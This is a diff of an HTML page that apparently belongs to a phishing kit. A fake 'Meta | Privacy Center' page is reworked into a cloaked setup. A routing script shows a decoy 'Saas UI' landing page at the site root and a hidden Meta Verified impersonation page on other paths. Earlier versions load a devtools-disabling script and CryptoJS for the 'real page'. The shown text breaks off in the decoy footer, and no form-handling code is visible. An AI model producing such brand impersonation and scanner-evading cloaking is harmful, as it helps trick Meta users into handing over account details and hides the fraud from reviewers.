@@ -1,379 +1,537 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta | Privacy Center</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css">
-    <link rel="stylesheet" href="./public/styles/checkbox.css">
-    <link rel="stylesheet" href="./public/styles/style.css">
-    <link rel="icon" href="./public/favicon-32x32.png">
-
-    <!-- Tailwind CSS CDN -->
+    <title id="pageTitle">Saas UI Landingspage</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: '#5D87FF',
-                        secondary: '#212121'
-                    }
-                }
-            }
-        }
-    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
-    <!-- CryptoJS for encryption -->
+    <!-- CryptoJS for encryption (used by real page) -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+    <style>
+        /* ========== SHARED ========== */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Inter', sans-serif; }
+
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* ========== DECOY PAGE (Saas UI) ========== */
+        #decoyPage {
+            background: #0e1012;
+            color: white;
+            min-height: 100vh;
+        }
+        #decoyPage header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            backdrop-filter: blur(5px);
+            z-index: 100;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        #decoyPage .nav-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        #decoyPage .logo svg { height: 32px; }
+        #decoyPage .nav-links { display: flex; align-items: center; gap: 0.5rem; }
+        #decoyPage .nav-links a {
+            color: rgba(255,255,255,0.7);
+            text-decoration: none;
+            font-size: 0.8125rem;
+            font-weight: 500;
+            padding: 0.375rem 0.75rem;
+            border-radius: 6px;
+            transition: color 0.2s;
+        }
+        #decoyPage .nav-links a:hover { color: white; }
+        #decoyPage .btn-signup-nav {
+            background: #8952e0;
+            color: white !important;
+            padding: 0.375rem 0.75rem;
+            border-radius: 6px;
+            font-weight: 600;
+        }
+        #decoyPage .btn-signup-nav:hover { background: #7434db !important; }
+
+        #decoyPage .hero {
+            padding-top: 9rem;
+            padding-bottom: 8rem;
+            position: relative;
+            overflow: hidden;
+        }
+        #decoyPage .hero-bg {
+            position: absolute;
+            inset: 0;
+            background:
+                radial-gradient(at top left, #4f1d9e 30%, transparent 80%),
+                radial-gradient(at bottom, #2ab4d9 0%, transparent 60%),
+                radial-gradient(at bottom left, #53c2e1 0%, transparent 50%);
+            opacity: 0.5;
+            z-index: 0;
+        }
+        #decoyPage .hero-content {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            align-items: center;
+            gap: 4rem;
+        }
+        @media (max-width: 768px) {
+            #decoyPage .hero-content { grid-template-columns: 1fr; }
+            #decoyPage .hero-screenshot { display: none; }
+        }
+        #decoyPage .hero h1 {
+            font-size: clamp(2.5rem, 5vw, 3.5rem);
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -0.03em;
+            margin-bottom: 1.5rem;
+        }
+        #decoyPage .hero p {
+            font-size: 1.25rem;
+            color: #7d7f83;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        #decoyPage .hero-buttons { display: flex; gap: 1rem; flex-wrap: wrap; }
+        #decoyPage .btn-primary {
+            background: #8952e0;
+            color: white;
+            padding: 0.875rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 1rem;
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+            display: inline-flex; align-items: center;
+        }
+        #decoyPage .btn-primary:hover { background: #7434db; }
+        #decoyPage .btn-outline {
+            background: transparent;
+            color: white;
+            padding: 0.875rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 1rem;
+            border: 1px solid rgba(255,255,255,0.25);
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+            display: inline-flex; align-items: center; gap: 0.5rem;
+        }
+        #decoyPage .btn-outline:hover { background: rgba(255,255,255,0.1); }
+        #decoyPage .hero-screenshot {
+            position: relative;
+            height: 400px;
+            overflow: hidden;
+            border-radius: 12px;
+            background: #1d2025;
+            border: 1px solid rgba(255,255,255,0.08);
+            display: flex; align-items: center; justify-content: center;
+        }
+        #decoyPage .screenshot-placeholder {
+            color: #52555a;
+            font-size: 0.875rem;
+            text-align: center;
+            padding: 2rem;
+        }
+
+        #decoyPage .benefits {
+            padding: 5rem 1.5rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        #decoyPage .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 2rem;
+        }
+        @media (max-width: 900px) {
+            #decoyPage .benefits-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+        #decoyPage .benefit-item .icon-wrap {
+            width: 2.5rem; height: 2.5rem;
+            background: rgba(137,82,224,0.2);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: #a379e7;
+            margin-bottom: 1rem;
+        }
+        #decoyPage .benefit-item h3 { font-size: 1rem; font-weight: 700; margin-bottom: 0.5rem; }
+        #decoyPage .benefit-item p { font-size: 0.875rem; color: #7d7f83; line-height: 1.6; }
+
+        #decoyPage .pricing {
+            padding: 5rem 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+        #decoyPage .pricing-bg {
+            position: absolute; inset: 0; z-index: 0;
+            background:
+                radial-gradient(at top left, #4f1d9e 30%, transparent 80%),
+                radial-gradient(at bottom, #2ab4d9 0%, transparent 60%);
+            opacity: 0.35;
+        }
+        #decoyPage .pricing-inner {
+            position: relative; z-index: 1;
+            max-width: 1000px; margin: 0 auto;
+        }
+        #decoyPage .section-title {
+            text-align: center;
+            font-size: clamp(1.5rem, 3vw, 2rem);
+            font-weight: 800;
+            margin-bottom: 0.75rem;
+        }
+        #decoyPage .section-sub {
+            text-align: center;
+            color: #7d7f83;
+            font-size: 1.125rem;
+            margin-bottom: 3rem;
+        }
+        #decoyPage .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+        }
+        @media (max-width: 700px) {
+            #decoyPage .pricing-grid { grid-template-columns: 1fr; }
+        }
+        #decoyPage .plan-card {
+            background: rgba(255,255,255,0.06);
+            border: 1px solid #33373d;
+            border-radius: 10px;
+            padding: 2rem;
+            display: flex; flex-direction: column; gap: 1rem;
+        }
+        #decoyPage .plan-card.featured { border-color: #8952e0; }
+        #decoyPage .plan-card h3 { font-size: 1rem; font-weight: 700; }
+        #decoyPage .plan-card .price { font-size: 1.5rem; font-weight: 800; }
+        #decoyPage .plan-card ul { list-style: none; display: flex; flex-direction: column; gap: 0.5rem; flex: 1; }
+        #decoyPage .plan-card ul li { font-size: 0.8125rem; color: #abadaf; display: flex; gap: 0.5rem; align-items: flex-start; }
+        #decoyPage .plan-card ul li::before { content: "✓"; color: #8952e0; flex-shrink: 0; margin-top: 1px; }
+        #decoyPage .plan-card .btn-primary { justify-content: center; font-size: 0.875rem; padding: 0.625rem 1rem; }
+
+        #decoyPage .footer {
+            padding: 2rem 2rem;
+            border-top: 1px solid #1d2025;
+            display: flex; align-items: center; justify-content: space-between;
+            max-width: 1400px; margin: 0 auto;
+            flex-wrap: wrap; gap: 1rem;
+        }
+        #decoyPage .footer p { font-size: 0.8125rem; color: #52555a; }
+
+        /* ========== REAL PAGE (Meta Verified) ========== */
+        #realPage {
+            background: linear-gradient(135deg, #f9f1f9 0%, #eaf3fd 50%, #edfbf2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+        }
+        #intro-overlay {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s ease;
+        }
+        #intro-overlay.fade-out { opacity: 0; pointer-events: none; }
+        #realPage .real-content {
+            max-width: 768px;
+            width: 100%;
+            padding: 1rem;
+        }
+        #realPage .real-header {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+        #realPage .meta-badge-icon { display: flex; align-items: center; gap: 8px; }
+        #realPage h1 { font-size: 2rem; font-weight: 700; color: #000; }
+        #realPage .real-body p { font-size: 15px; margin-top: 15px; line-height: 1.6; color: #333; }
+        #realPage .ticket { font-size: 16px; margin-top: 14px; color: #465a69; }
+        #realPage .guide { margin-top: 1rem; }
+        #realPage .guide b { font-size: 17px; font-weight: 700; display: block; margin-bottom: 15px; }
+        #realPage .guide p { font-size: 15px; margin-bottom: 10px; line-height: 1.6; color: #333; }
+        #realPage .submit-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 9999px;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px 24px;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            text-align: center;
+        }
+        #realPage .submit-btn:hover { background: #1558b0; }
+        #realPage .real-footer {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            justify-content: center;
+            font-size: 0.75rem;
+            color: #65676b;
+            margin-top: 2rem;
+        }
+        #realPage .real-footer a { color: #65676b; text-decoration: none; }
+        #realPage .real-footer a:hover { text-decoration: underline; }
+    </style>
 </head>
+<body>
 
-<body class="bg-[#ffffff] flex flex-col items-center justify-center h-[100vh] w-full">
-    <!-- NAVBAR START -->
-    <div class="bg-white min-h-[100vh] w-full rounded-[0px]">
-        <div
-            class='md:grid flex flex-col md:flex-row grid-cols-12 max-w-[1100px] mx-auto flex min-h-[100vh] max-h-[100vh] relative'>
-            <div
-                class='md:col-span-4 col-span-12 overflow-y-auto max-h-[100vh] md:sticky unset md:top-0 md:border-r border-[#DEE3E9] md:h-full h-[80px] w-full'>
-                <div class='w-full md:hidden flex items-center justify-between gap-3 w-full px-4 py-3 h-[min-content]'>
-                    <div class='w-[70px]'>
-                        <img src="/public/icons/ic_meta.svg" class='w-full' alt="tick" />
-                    </div>
-                    <div class='flex items-center justify-center gap-1 flex-col'>
-                        <div class='h-[4px] rounded-[10px] bg-[#344854] w-[32px]'></div>
-                        <div class='h-[4px] rounded-[10px] bg-[#344854] w-[32px]'></div>
-                        <div class='h-[4px] rounded-[10px] bg-[#344854] w-[32px]'></div>
-                    </div>
-                </div>
-                <div class='w-full md:block hidden px-3 pt-10'>
-                    <div class='w-[70px]'>
-                        <img src="/public/icons/ic_meta.svg" class='w-full' alt="tick" />
-                    </div>
-                    <h1 class='font-bold text-[26px] my-3'>Privacy Center</h1>
-                    <div class='text-[16px] pr-5 max-w-full w-full'>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 bg-[#344854] px-4 py-3 rounded-[16px]'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_home.svg" class='w-full h-full text-white white'
-                                        alt="home" />
-                                </div>
-                                <span class='text-white'>Privacy Center Home</span>
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_search.svg" class='w-full h-full' alt="search" />
-                                </div>
-                                <span class='text-black'>Search</span>
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_locked.svg" class='w-full h-full' alt="locked" />
-                                </div>
-                                <span class='text-black'>Privacy Policy</span>
-                            </div>
-                            <div
-                                class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px] transition-all duration-200'>
-                                <img src="/public/icons/ic_arrow.svg" class='w-full h-full' alt="arrow" />
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_other.svg" class='w-full h-full' alt="other" />
-                                </div>
-                                <span class='text-black'>Other rules and articles</span>
-                            </div>
-                            <div
-                                class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px] transition-all duration-200'>
-                                <img src="/public/icons/ic_arrow.svg" class='w-full h-full' alt="arrow" />
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_setting.svg" class='w-full h-full' alt="setting" />
-                                </div>
-                                <span class='text-black'>Settings</span>
-                            </div>
-                            <div
-                                class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px] transition-all duration-200'>
-                                <img src="/public/icons/ic_arrow.svg" class='w-full h-full' alt="arrow" />
-                            </div>
-                        </div>
-                    </div>
-                </div>
+<!-- ===================== ROUTING SCRIPT ===================== -->
+<script>
+(function() {
+    // Lấy path hiện tại (phần sau dấu /)
+    var path = window.location.pathname;
+    // Lấy phần sau dấu / cuối cùng
+    var slug = path.replace(/^\/+|\/+$/g, ''); // xóa / đầu và cuối
+
+    // Nếu slug KHÔNG rỗng => hiện trang thật (Meta Verified)
+    // Nếu slug rỗng => hiện trang mồi (Saas UI)
+    window.__showRealPage = (slug.length > 0);
+})();
+</script>
+
+<!-- ===================== DECOY PAGE (Saas UI) ===================== -->
+<div id="decoyPage" class="page">
+    <header>
+        <div class="nav-inner">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 550 172">
+                    <path fill="#8952e0" d="M117.67 16.59h-54c-1.86 0-3.36 1.5-3.36 3.36V46.2c0 2.11-.89 4.11-2.46 5.52l-.1.09a7.438 7.438 0 0 1-4.96 1.9H20.24c-1.86 0-3.36 1.5-3.36 3.36v38.44c0 1.86 1.5 3.36 3.36 3.36h34.51c1.86 0 3.36-1.5 3.36-3.36V59.25c0-2.11.89-4.11 2.46-5.52a7.438 7.438 0 0 1 4.96-1.9h52.15c1.86 0 3.36-1.5 3.36-3.36V19.95a3.37 3.37 0 0 0-3.37-3.36z"/>
+                    <path fill="#8952e0" d="M117.67 72.78h-34.5c-1.86 0-3.36 1.5-3.36 3.36v36.27c0 2.11-.89 4.11-2.46 5.52a7.438 7.438 0 0 1-4.96 1.9H20.24c-1.86 0-3.36 1.5-3.36 3.36v28.56c0 1.86 1.5 3.36 3.36 3.36h54c1.86 0 3.36-1.5 3.36-3.36v-26.3c0-2.11.89-4.11 2.46-5.52l.1-.09a7.438 7.438 0 0 1 4.96-1.9h32.54c1.86 0 3.36-1.5 3.36-3.36V76.13a3.337 3.337 0 0 0-3.35-3.35z"/>
+                    <path fill="#fff" d="m221.7 58.08-5.35 10.82c-5.99-3.69-13.5-5.99-19.48-5.99-5.73 0-9.93 1.91-9.93 6.75 0 12.48 36.04 5.73 35.91 30.31 0 13.88-12.35 20.12-25.98 20.12-9.93 0-20.5-3.31-27.25-9.42l5.22-10.44c5.86 5.22 15.28 8.4 22.67 8.4 6.24 0 11.08-2.17 11.08-7.26 0-13.88-35.66-6.11-35.53-30.56 0-13.75 11.97-19.61 24.96-19.61 8.53 0 17.57 2.55 23.68 6.88zM277.38 111.31c-4.84 5.99-12.61 8.91-22.41 8.91-14.64 0-23.81-9.04-23.81-21.01 0-12.35 9.3-20.25 25.6-20.37h20.5V76.8c0-8.53-5.48-13.63-16.17-13.63-6.49 0-13.24 2.29-19.99 6.88l-5.98-10.19c9.42-5.6 16.3-8.53 29.16-8.53 17.45 0 27.25 8.91 27.38 23.81l.13 44.44H277.4v-8.27zm-.13-15.54v-6.24h-18.34c-9.55 0-14.01 2.55-14.01 9.04 0 6.11 4.97 10.06 13.12 10.06 10.45 0 18.47-5.47 19.23-12.86z"/>
+                </svg>
             </div>
-            <!-- NAVBAR END -->
-
-            <!-- MAIN CONTENT START -->
-            <div class="md:col-span-8 col-span-12 md:px-8 px-4 md:pt-7 pt-5 max-h-[100vh] sticky top-0 overflow-hidden">
-
-                <!-- TOP -->
-                <div>
-                    <div class="md:flex hidden justify-end">
-                        <button type="button" aria-label="Close"
-                            class="w-[40px] h-[40px] cursor-pointer rounded-full bg-transparent flex items-center justify-center text-[#667085] hover:bg-[#F2F4F7] transition-colors">
-                            <img src="/public/icons/ic_close.svg" class="w-[24px] h-[24px]" alt="close">
-                        </button>
-                    </div>
-
-                    <h1 class="font-[700] text-[23px]">Privacy Center</h1>
-
-                    <div>
-                        <p class="my-2">
-                            Make the privacy choices that are right for you. Learn how to manage and control your
-                            privacy on Facebook, Instagram, Messenger, and other Meta Products.
-                        </p>
-
-                        <p class="font-[600] text-[17px]">We build privacy into our products</p>
-
-                        <div class="my-4 flex flex-col md:flex-row md:items-stretch gap-4">
-
-                            <!-- CARD -->
-                            <div class="flex-1 rounded-[16px] border border-[#E3E8EF] bg-white p-4 flex gap-3 flex-col">
-                                <div
-                                    class="w-[40px] h-[40px] rounded-[12px] bg-[#E7F0FF] flex items-center justify-center overflow-hidden">
-                                    <img src="/public/icons/ic_message.png" class="w-full h-full" alt="">
-                                </div>
-                                <div>
-                                    <p class="font-[600] text-[17px]">Private messaging</p>
-                                    <p class="text-[15px] text-[#475467]">
-                                        Our messaging products offer end-to-end encryption so your conversations stay
-                                        safe and secure.
-                                    </p>
-                                </div>
-                            </div>
-
-                            <!-- CARD -->
-                            <div
-                                class="md:block hidden flex-1 rounded-[16px] border border-[#E3E8EF] bg-white p-4 flex gap-3 flex-col">
-                                <div
-                                    class="w-[40px] h-[40px] rounded-[12px] bg-[#FFEAD5] flex items-center justify-center overflow-hidden">
-                                    <img src="/public/icons/ic_client.png" class="w-full h-full" alt="">
-                                </div>
-                                <div>
-                                    <p class="font-[600] text-[17px]">Teen privacy</p>
-                                    <p class="text-[15px] text-[#475467]">
-                                        Our default settings on Facebook and Instagram help keep teens' accounts
-                                        private.
-                                    </p>
-                                </div>
-                            </div>
-
-                        </div>
-                    </div>
-
-                    <!-- SETTINGS -->
-                    <div class="pt-4">
-                        <p class="font-[600] text-[17px]">Settings to help control your privacy</p>
-                        <p class="text-[13px] text-[#5D6C7B]">
-                            We build easy-to-use settings you can use to make the privacy choices that are right for
-                            you.
-                        </p>
-
-                        <div class="my-4 rounded-[16px] border border-[#E3E8EF] bg-white overflow-hidden">
-                            <img src="/public/images/company_brand.png" class="w-full h-full" alt="">
-                        </div>
-                    </div>
-
-                    <!-- PRIVACY TOPICS -->
-                    <div class="mb-5">
-                        <p class="font-[600] text-[17px]">Privacy topics</p>
-                        <p class="text-[13px] text-[#5D6C7B]">
-                            Get answers to your privacy questions and manage your privacy in a way that’s right for you.
-                        </p>
-
-                        <div class="my-4 flex flex-col md:flex-row gap-4">
-
-                            <div class="flex-1 rounded-[16px] border border-[#E3E8EF] bg-white overflow-hidden">
-                                <div class="h-[130px] relative">
-                                    <img src="/public/images/privacy_center.png" class="w-full h-full object-cover"
-                                        alt="">
-                                </div>
-                                <div class="p-4">
-                                    <p class="text-[12px] font-[600] text-[#475467]">Generative AI</p>
-                                    <p class="font-[600] text-[16px]">Generative AI at Meta</p>
-                                </div>
-                            </div>
-
-                            <div class="flex-1 rounded-[16px] border border-[#E3E8EF] bg-white overflow-hidden">
-                                <div class="h-[130px] relative">
-                                    <img src="/public/images/center_policy.png" class="w-full h-full object-cover"
-                                        alt="">
-                                </div>
-                                <div class="p-4">
-                                    <p class="text-[12px] font-[600] text-[#475467]">Safety</p>
-                                    <p class="font-[600] text-[16px]">
-                                        Manage what you share to feel safer using our products
-                                    </p>
-                                </div>
-                            </div>
-
-                        </div>
-                    </div>
-                </div>
-
-                <!-- PRIVACY POLICY -->
-                <div class="mt-4">
-                    <p class="text-[15px] pb-1">Learn more in the Privacy Policy</p>
-
-                    <div
-                        class="rounded-tl-[12px] rounded-tr-[12px] bg-white py-3 border-b border-[#E3E8EF] flex items-center justify-between cursor-pointer">
-                        <div class="flex gap-3 items-center">
-                            <img src="/public/icons/ic_women.png" class="w-[45px] h-[45px]" alt="">
-                            <div>
-                                <p class="text-[15px] font-[500]">What is the Privacy Policy and what does it say?</p>
-                                <p class="text-[14px] font-[300]">Privacy Policy</p>
-                            </div>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-
-                    <div
-                        class="rounded-bl-[12px] rounded-br-[12px] bg-white py-3 flex items-center justify-between cursor-pointer">
-                        <div class="flex gap-3 items-center">
-                            <img src="/public/icons/ic_women.png" class="w-[45px] h-[45px]" alt="">
-                            <div>
-                                <p class="text-[15px] font-[500]">How you can manage or delete your information</p>
-                                <p class="text-[14px] font-[300]">Privacy Policy</p>
-                            </div>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-                </div>
-
-                <!-- USER AGREEMENT -->
-                <div class="mt-4 mb-3">
-                    <p class="text-[15px] pb-1">For more details, see the User Agreement</p>
-
-                    <div class="rounded-[12px] bg-white py-3 flex items-center justify-between cursor-pointer">
-                        <div class="flex gap-3 items-center">
-                            <img src="/public/icons/ic_docs.png" class="w-[45px] h-[45px]" alt="">
-                            <div>
-                                <p class="text-[15px] font-[500]">AI Product</p>
-                                <p class="text-[14px] font-[300]">User Agreement</p>
-                            </div>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-                </div>
-
-                <!-- ADDITIONAL -->
-                <div class="mt-4 mb-4">
-                    <p class="text-[15px] pb-1">Additional resources</p>
-
-                    <div class="bg-white py-3 border-b border-[#E3E8EF] flex justify-between cursor-pointer">
-                        <div>
-                            <p class="text-[15px] font-[500]">How uses information for generative AI models</p>
-                            <p class="text-[14px] font-[300]">Privacy Center</p>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-
-                    <div class="bg-white py-3 border-b border-[#E3E8EF] flex justify-between cursor-pointer">
-                        <div>
-                            <p class="text-[15px] font-[500]">Cards with information about the operation of AI systems
-                            </p>
-                            <p class="text-[14px] font-[300]">Product AI website</p>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-
-                    <div class="rounded-bl-[12px] rounded-br-[12px] bg-white py-3 flex justify-between cursor-pointer">
-                        <div>
-                            <p class="text-[15px] font-[500]">Introduction to Generative AI</p>
-                            <p class="text-[14px] font-[300]">For teenagers</p>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-                </div>
-
-                <p class="text-[14px] text-[#465a69] mb-3">
-                    We continually identify potential privacy risks, including when collecting, using or sharing
-                    personal information, and developing methods to reduce these risks.
-                    Read more about
-                    <span class="text-[#0064E0] cursor-pointer">Privacy Policy</span>
-                </p>
-
-            </div>
+            <nav class="nav-links">
+                <a href="#">Features</a>
+                <a href="#">Pricing</a>
+                <a href="#">FAQ</a>
+                <a href="#">Login</a>
+                <a href="#" class="btn-signup-nav">Sign Up</a>
+            </nav>
         </div>
+    </header>
 
-        <!-- Loading Modal -->
-        <div id="loadingModal" class="fixed inset-0 z-99 flex items-center justify-center bg-black/40"
-            style="backdrop-filter:blur(6px)">
-            <div
-                class="max-h-full w-full max-w-lg flex flex-col overflow-y-auto transform transition-all duration-200 ">
-                <div class="flex flex-col items-center justify-center flex-1">
-                    <div
-                        class="loader ease-linear rounded-full border-[3px] border-t-[30x] border-white h-[36px] w-[36px]">
-                    </div>
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="hero-content">
+            <div>
+                <h1>Build beautiful<br>software faster</h1>
+                <p>Saas UI is a <em style="color:white;font-style:normal;">React component library</em><br>that doesn't get in your way and helps you<br>build intuitive SaaS products with speed.</p>
+                <div class="hero-buttons">
+                    <a href="#" class="btn-primary">Sign Up</a>
+                    <a href="#" class="btn-outline">View demo <span>→</span></a>
+                </div>
+            </div>
+            <div class="hero-screenshot">
+                <div class="screenshot-placeholder">
+                    <div style="font-size:2rem;margin-bottom:0.5rem;">📊</div>
+                    <div>Dashboard Preview</div>
+                    <div style="margin-top:0.5rem;font-size:0.75rem;">Replace with actual screenshot</div>
                 </div>
             </div>
         </div>
+    </section>
 
-        <script src="./public/js/disableDevtool.js"></script>
-        <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                const loadingModal = document.getElementById('loadingModal');
-                const countdownElement = document.getElementById('countdown');
-                let countdown = 4;
+    <section class="benefits">
+        <div class="benefits-grid">
+            <div class="benefit-item">
+                <div class="icon-wrap">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
+                </div>
+                <h3>Accessible</h3>
+                <p>All components strictly follow WAI-ARIA standards.</p>
+            </div>
+            <div class="benefit-item">
+                <div class="icon-wrap">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/></svg>
+                </div>
+                <h3>Themable</h3>
+                <p>Fully customize all components to your brand with theme support.</p>
+            </div>
+            <div class="benefit-item">
+                <div class="icon-wrap">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                </div>
+                <h3>Composable</h3>
+                <p>Compose components to fit your needs and mix them together.</p>
+            </div>
+            <div class="benefit-item">
+                <div class="icon-wrap">
+                    <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
+                </div>
+                <h3>Productive</h3>
+                <p>Designed to reduce boilerplate and fully typed, build at speed.</p>
+            </div>
+        </div>
+    </section>
 
-                // Show modal
-                loadingModal.classList.remove('hidden');
-                loadingModal.classList.add('block');
+    <section class="pricing">
+        <div class="pricing-bg"></div>
+        <div class="pricing-inner">
+            <h2 class="section-title">Pricing for every stage</h2>
+            <p class="section-sub">Pay once and get life-time access to our high quality components.</p>
+            <div class="pricing-grid">
+                <div class="plan-card">
+                    <h3>Open Source</h3>
+                    <p style="font-size:0.8125rem;color:#7d7f83;">Basic components, perfect to get started.</p>
+                    <div class="price">Free</div>
+                    <ul>
+                        <li>MIT License</li>
+                        <li>Authentication (Clerk/Supabase)</li>
+                        <li>Form (react-hook-form)</li>
+                        <li>Modals manager</li>
+                        <li>Web3 components</li>
+                    </ul>
+                    <a href="#" class="btn-primary">Sign Up</a>
+                </div>
+                <div class="plan-card featured">
+                    <h3>Bootstrap</h3>
+                    <p style="font-size:0.8125rem;color:#7d7f83;">Complete frontend stack for small teams.</p>
+                    <div class="price">Free</div>
+                    <ul>
+                        <li>One project</li>
+                        <li>One developer</li>
+                        <li>Advanced components</li>
+                        <li>Multiple themes</li>
+                        <li>Next.js and Electron boilerplates</li>
+                        <li>Private discord community</li>
+                        <li>1 year of updates</li>
+                    </ul>
+                    <a href="#" class="btn-primary">Sign Up</a>
+                </div>
+                <div class="plan-card">
+                    <h3>Startup</h3>
+                    <p style="font-size:0.8125rem;color:#7d7f83;">Unlimited license for growing teams.</p>
+                    <div class="price">€499,-</div>
+                    <ul>
+                        <li>Unlimited projects</li>
+                        <li>Unlimited developers</li>
+                        <li>1 year of updates</li>
+                        <li>Everything from Bootstrap</li>
+                        <li>Private beta access</li>
+                    </ul>
+                    <a href="#" class="btn-primary">Sign Up</a>
+                </div>
+            </div>
+        </div>
+    </section>
 
-                const interval = setInterval(() => {
-                    countdown--;
+    <footer>
+        <div class="footer">
+            <p style="color:#52555a;">© 2025 Saas UI — The React component library for startups</p>
+            <div style="display:flex;gap:1rem;">
+                <a href="#" style="color:#52555a;font-size:0.8125rem;text-decoration:none;">Contact</a>
